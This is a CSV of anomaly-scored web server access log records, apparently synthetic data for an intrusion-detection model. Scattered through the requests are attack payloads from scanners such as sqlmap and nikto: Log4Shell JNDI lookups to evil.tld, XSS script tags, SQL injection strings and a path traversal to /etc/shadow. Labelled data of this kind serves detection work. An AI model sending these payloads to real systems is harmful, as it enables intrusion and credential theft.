score_content,score_session,score_fused,score_fused_norm,line
72.99398803710938,,72.99398803710938,72.99398803710938,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30127.880859375,,30127.880859375,30127.880859375,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
127.21222686767578,,127.21222686767578,127.21222686767578,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
74.54509735107422,,74.54509735107422,74.54509735107422,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.104227304458618,,3.104227304458618,3.104227304458618,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
95.73490905761719,,95.73490905761719,95.73490905761719,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
24.608673095703125,,24.608673095703125,24.608673095703125,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.28377506136894226,,0.28377506136894226,0.28377506136894226,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
103.05254364013672,,103.05254364013672,103.05254364013672,{"remote_addr": "88.241.11.197", "time_local": "11/Jan/2025:09:05:31 -0700", "request": "TRACE /.git/config HTTP/2", "status": 200, "body_bytes_sent": 7025, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
16.38212013244629,,16.38212013244629,16.38212013244629,{"remote_addr": "18.42.125.166", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "PUT /about HTTP/2", "status": 302, "body_bytes_sent": 15660, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
25.98577308654785,,25.98577308654785,25.98577308654785,{"remote_addr": "179.112.172.176", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13260, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
73.19529724121094,,73.19529724121094,73.19529724121094,{"remote_addr": "7.21.136.71", "time_local": "11/Jan/2025:09:05:33 -0700", "request": "OPTIONS /server-status HTTP/2", "status": 200, "body_bytes_sent": 17707, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
7.685081481933594,,7.685081481933594,7.685081481933594,{"remote_addr": "139.206.242.159", "time_local": "11/Jan/2025:09:05:34 -0700", "request": "POST /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17410, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
95.757568359375,,95.757568359375,95.757568359375,{"remote_addr": "34.171.190.41", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8585, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
30220.23828125,,30220.23828125,30220.23828125,{"remote_addr": "59.151.127.62", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 114, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
50.29545974731445,,50.29545974731445,50.29545974731445,{"remote_addr": "109.37.251.205", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 16746, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
30227.798828125,,30227.798828125,30227.798828125,{"remote_addr": "53.249.188.148", "time_local": "11/Jan/2025:09:05:36 -0700", "request": "TRACE /index.html HTTP/2", "status": 403, "body_bytes_sent": 118, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30174.248046875,,30174.248046875,30174.248046875,{"remote_addr": "141.88.220.206", "time_local": "11/Jan/2025:09:05:37 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 401, "body_bytes_sent": 601, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.1371476650238037,,3.1371476650238037,3.1371476650238037,{"remote_addr": "67.74.89.227", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 5645, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
71.68677520751953,,71.68677520751953,71.68677520751953,{"remote_addr": "37.84.254.186", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30.85943031311035,,30.85943031311035,30.85943031311035,{"remote_addr": "214.151.119.72", "time_local": "11/Jan/2025:09:05:39 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 4208, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30148.7109375,,30148.7109375,30148.7109375,{"remote_addr": "67.193.198.62", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 403, "body_bytes_sent": 1073, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.282989263534546,,2.282989263534546,2.282989263534546,{"remote_addr": "181.248.171.87", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 8759, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
50.13937759399414,,50.13937759399414,50.13937759399414,{"remote_addr": "122.150.161.62", "time_local": "11/Jan/2025:09:05:41 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16499, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
35.81364822387695,,35.81364822387695,35.81364822387695,{"remote_addr": "238.227.252.24", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2262, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.8993700742721558,,1.8993700742721558,1.8993700742721558,{"remote_addr": "123.52.49.89", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
73.40682983398438,,73.40682983398438,73.40682983398438,{"remote_addr": "197.54.97.224", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "OPTIONS /about HTTP/2", "status": 200, "body_bytes_sent": 5762, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
47.59939956665039,,47.59939956665039,47.59939956665039,{"remote_addr": "241.177.150.138", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.9588298797607422,,1.9588298797607422,1.9588298797607422,{"remote_addr": "36.184.68.223", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 2226, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
24.420013427734375,,24.420013427734375,24.420013427734375,{"remote_addr": "99.229.118.59", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
104.64755249023438,,104.64755249023438,104.64755249023438,{"remote_addr": "74.190.96.21", "time_local": "11/Jan/2025:09:05:45 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
76.35155487060547,,76.35155487060547,76.35155487060547,{"remote_addr": "128.215.150.137", "time_local": "11/Jan/2025:09:05:46 -0700", "request": "OPTIONS /about HTTP/2", "status": 304, "body_bytes_sent": 13292, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.431194305419922,,24.431194305419922,24.431194305419922,{"remote_addr": "247.127.208.231", "time_local": "11/Jan/2025:09:05:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 17324, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
95.73623657226562,,95.73623657226562,95.73623657226562,{"remote_addr": "66.72.129.131", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 4386, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
73.33879852294922,,73.33879852294922,73.33879852294922,{"remote_addr": "152.85.6.185", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /contact HTTP/2", "status": 204, "body_bytes_sent": 8593, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
104.84782409667969,,104.84782409667969,104.84782409667969,{"remote_addr": "141.195.23.159", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 15696, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
127.27458190917969,,127.27458190917969,127.27458190917969,{"remote_addr": "243.155.238.18", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.362482070922852,,13.362482070922852,13.362482070922852,{"remote_addr": "226.99.142.218", "time_local": "11/Jan/2025:09:05:50 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15827, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
95.76496124267578,,95.76496124267578,95.76496124267578,{"remote_addr": "177.86.226.20", "time_local": "11/Jan/2025:09:05:51 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 15936, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
127.16914367675781,,127.16914367675781,127.16914367675781,{"remote_addr": "55.35.12.184", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 17541, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
2.03395414352417,,2.03395414352417,2.03395414352417,{"remote_addr": "2.28.78.233", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2272, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.953026533126831,,1.953026533126831,1.953026533126831,{"remote_addr": "191.85.132.134", "time_local": "11/Jan/2025:09:05:53 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16629, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.446503639221191,,13.446503639221191,13.446503639221191,{"remote_addr": "46.11.154.19", "time_local": "11/Jan/2025:09:05:54 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 10262, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30170.466796875,,30170.466796875,30170.466796875,{"remote_addr": "84.212.229.210", "time_local": "11/Jan/2025:09:05:55 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1193, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
27.259485244750977,,27.259485244750977,27.259485244750977,{"remote_addr": "158.127.22.228", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 10459, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
5.133693218231201,,5.133693218231201,5.133693218231201,{"remote_addr": "12.22.90.121", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 8721, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
70.11077117919922,,70.11077117919922,70.11077117919922,{"remote_addr": "209.187.96.182", "time_local": "11/Jan/2025:09:05:57 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 11347, "http_referer": "-", "http_user_agent": "dirb/2.22"}
127.1253662109375,,127.1253662109375,127.1253662109375,{"remote_addr": "51.72.186.152", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 6602, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
13.364357948303223,,13.364357948303223,13.364357948303223,{"remote_addr": "70.22.70.105", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16389, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
27.419757843017578,,27.419757843017578,27.419757843017578,{"remote_addr": "94.187.221.201", "time_local": "11/Jan/2025:09:05:59 -0700", "request": "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 6570, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
127.2020492553711,,127.2020492553711,127.2020492553711,{"remote_addr": "192.85.76.122", "time_local": "11/Jan/2025:09:06:00 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14069, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.32605743408203,,27.32605743408203,27.32605743408203,{"remote_addr": "176.163.28.7", "time_local": "11/Jan/2025:09:06:01 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 12129, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
27.298694610595703,,27.298694610595703,27.298694610595703,{"remote_addr": "10.29.167.70", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 14906, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
47.927486419677734,,47.927486419677734,47.927486419677734,{"remote_addr": "32.54.38.89", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 4528, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
74.63945770263672,,74.63945770263672,74.63945770263672,{"remote_addr": "199.189.53.254", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 304, "body_bytes_sent": 16852, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
127.26775360107422,,127.26775360107422,127.26775360107422,{"remote_addr": "122.34.104.49", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 14796, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
95.61526489257812,,95.61526489257812,95.61526489257812,{"remote_addr": "173.246.68.238", "time_local": "11/Jan/2025:09:06:05 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6680, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
